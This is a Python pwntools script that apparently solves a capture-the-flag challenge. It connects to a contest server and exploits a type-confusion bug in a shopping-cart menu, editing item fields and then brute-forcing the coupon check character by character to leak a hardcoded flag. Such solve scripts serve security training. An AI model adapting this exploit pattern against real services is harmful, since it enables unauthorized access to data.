from pwn import *
import string

TYPE_UNDEFINED = 0
TYPE_BREAD     = 'b'
TYPE_PASTA     = 'p' 
TYPE_SOUP      = 's'
TYPE_DRINK     = 'd'
TYPE_VEGETABLE = 'v'
TYPE_FRUIT     = 'f'
TYPE_COUPON    = 'c'

def menu():
    r.recvuntil("Checkout\r\n")

def edit(index, propertyIndex, value):
    menu()
    #r.recvline()
    r.sendline(str(index))
    #print(r.recv())
    #r.recvuntil("Cancel\r\n")
    r.sendline(str(propertyIndex))
    r.sendline(str(value))
    #r.recvuntil("Item updated!\r\n")

def load_coupons():
    menu()
    r.sendline("5")
    r.recvuntil("Please enter your coupon:\r\n")
    r.sendline("asdf")
    r.recvuntil("Invalid coupon!\r\n")
options = string.printable

flag = "CSA{Typ3_C0nFu510n_iS_a_ReAL_Pr0bL3m}"
#CSA{T

r = remote("csa-2.csa-challenge.com", 2222)

#load_coupons()
#r.interactive()

#edit(2, 4, 5)
#for c in options:
#    menu()
#    r.sendline("5")
#    r.recvuntil("Please enter your coupon:\r\n")
#    r.sendline(f"{flag}{c}")
#    line = r.recvline()
#    if "Applied" in line:
#        print(f"flag = {flag}{c}")
#        break

#r.interactive()
r.recvuntil("6 - Checkout\r\n")
r.sendline("5")
r.recvuntil("\r\n")
r.sendline("Grabage!")

(r.recvuntil("6 - Checkout\r\n"))
#r.interactive()
r.sendline("2")
r.recvuntil("Which item index would you like to edit?\r\n")
r.sendline("2")
r.recvuntil("Cancel\r\n")
r.sendline("4")
r.recvuntil("Enter new loaves amount: ")
#len check
r.sendline(str(len(flag) + 1))

r.recvuntil("6 - Checkout\r\n")
r.sendline("2")
r.recvuntil("Which item index would you like to edit?\r\n")
r.sendline("2")
r.recvuntil("Cancel\r\n")
r.sendline("3")
r.recvuntil("Enter new items amount: ")
r.sendline("0")

r.recvuntil("6 - Checkout\r\n")
r.sendline("2")
r.recvuntil("Which item index would you like to edit?\r\n")
r.sendline("2")

for c in options:
    r.recvuntil("6 - Checkout\r\n")
    r.sendline("5")
    r.recvuntil("\r\n")
    r.sendline(flag + c)
    line = r.recvuntil("\r\n")
    if b"Applied" in line:
        print(f"{flag}{c}")
        print("woooho")
        break